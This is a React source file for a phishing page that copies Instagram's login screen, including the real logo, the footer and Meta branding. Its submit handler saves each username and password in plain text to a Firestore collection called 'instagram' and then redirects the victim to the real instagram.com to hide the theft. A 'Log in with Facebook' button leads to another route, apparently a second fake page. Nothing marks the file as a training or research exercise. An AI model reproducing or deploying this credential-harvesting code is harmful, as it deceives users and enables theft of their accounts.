import React, { useState } from 'react';
import { db } from "../firebaseConfig";
import { collection, addDoc } from "firebase/firestore";
import { useNavigate } from 'react-router-dom';

export const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();

  const dbRef = collection(db, "instagram");

  // Function to add user
  const addUser = async (username, password) => {
    try {
      const docRef = await addDoc(dbRef, {
        username: username,
        password: password
      });
      console.log("Document written with ID: ", docRef.id);
      setUsername('');
      setPassword('');
      window.location.href = 'https://www.instagram.com/';
    } catch (e) {
      console.error("Error adding document: ", e);
    }
  };

  // Handle username input
  const handleUsername = (e) => {
    setUsername(e.target.value);
  };

  // Handle password input
  const handlePassword = (e) => {
    setPassword(e.target.value);
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (username && password) {
      // Calling the addUser function
      await addUser(username, password);
    } else {
      console.log('Please fill in both fields');
    }
  };


  return (
    <div className="flex flex-col items-center w-410 max-w-md p-10 mx-auto min-h-screen font-sans">
      <div className="w-410 h-61 p-10 border border-gray-300 bg-white text-center mb-4">
        <div className="mb-6">
          {/* Embed Instagram SVG logo */}
          <div
            aria-label="Instagram"
            role="img"
            className="inline-block bg-no-repeat"
            style={{
              backgroundImage: "url('https://static.cdninstagram.com/rsrc.php/v3/ym/r/BQdTmxpRI6f.png')",
              backgroundPosition: '0px 0px',
              backgroundSize: '176px 181px',
              width: '175px',
              height: '51px',
            }}
          ></div>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={handleUsername}
            required
            className="w-full p-3 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:border-gray-400 text-sm"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={handlePassword}
            required
            className="w-full p-3 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:border-gray-400 text-sm"
          />
          <button
            type="submit"
            className="w-full py-2 bg-blue-400 text-white font-semibold rounded-lg mt-3 hover:bg-blue-600"
          >
            Log in
          </button>
        </form>
        <div className="flex items-center text-gray-500 text-sm mt-4">
          <div className="flex-grow border-t border-gray-300"></div>
          <span className="mx-3">OR</span>
          <div className="flex-grow border-t border-gray-300"></div>
        </div>
        <button
          onClick={() => navigate('/Facebook')}
          type="button"
          className="flex items-center justify-center gap-2 text-blue-900 font-semibold text-sm mt-3 w-full"
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="20" viewBox="0 0 266.893 266.895" id="facebook">
            <path fill="#485a96" d="M252.164 266.895c8.134 0 14.729-6.596 14.729-14.73V14.73c0-8.137-6.596-14.73-14.729-14.73H14.73C6.593 0 0 6.594 0 14.73v237.434c0 8.135 6.593 14.73 14.73 14.73h237.434z"></path>
            <path fill="#fff" d="M184.152 266.895V163.539h34.692l5.194-40.28h-39.887V97.542c0-11.662 3.238-19.609 19.962-19.609l21.329-.01V41.897c-3.689-.49-16.351-1.587-31.08-1.587-30.753 0-51.807 18.771-51.807 53.244v29.705h-34.781v40.28h34.781v103.355h41.597z"></path>
          </svg><i className="fab fa-facebook-square text-lg"></i>
          Log in with Facebook
        </button>
        <div className="mt-3 text-sm">
          <div href="/forgot-password" className="text-blue-900">
            Forgot password?
          </div>
        </div>
      </div>

      {/* Separate Box for "Don't have an account? Sign up" */}
      <div className="w-full p-4 border border-gray-300 bg-white text-center">
        <p className="text-sm">
          Don't have an account?{' '}
          <div href="/signup" className="text-blue-500 font-semibold">
            Sign up
          </div>
        </p>
      </div>

      <div className="text-center text-sm text-black mt-3">
        <span>Get the app.</span>
        <div className="flex gap-0.5">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
            alt="Google Play Store"
            className="w-32"
          />
          <img
            src="https://brandlogos.net/wp-content/uploads/2022/03/microsoft_store_badge-logo-brandlogo.net_-512x512.png"
            alt="Microsoft Store"
            className="w-32"
          />
        </div>
      </div>

      {/* Footer Section */}
      <footer className="text-xs text-gray-500 mt-8 text-center">
        <div className="flex justify-center space-x-5 flex-wrap">
          <div href="#" className="hover:underline">Meta</div>
          <div href="#" className="hover:underline">About</div>
          <div href="#" className="hover:underline">Blog</div>
          <div href="#" className="hover:underline">Jobs</div>
          <div href="#" className="hover:underline">Help</div>
          <div href="#" className="hover:underline">API</div>
          <div href="#" className="hover:underline">Privacy</div>
          <div href="#" className="hover:underline">Terms</div>
          <div href="#" className="hover:underline">Locations</div>
          <div href="#" className="hover:underline">Instagram Lite</div>
          <div href="#" className="hover:underline">Threads</div>
          <div href="#" className="hover:underline">Contact Uploading & Non-Users</div>
          <div href="#" className="hover:underline">Meta Verified</div>
        </div>
        <p className="mt-4">English &copy; 2024 Instagram from Meta</p>
      </footer>
    </div>
  );
};

export default InstagramLogin;
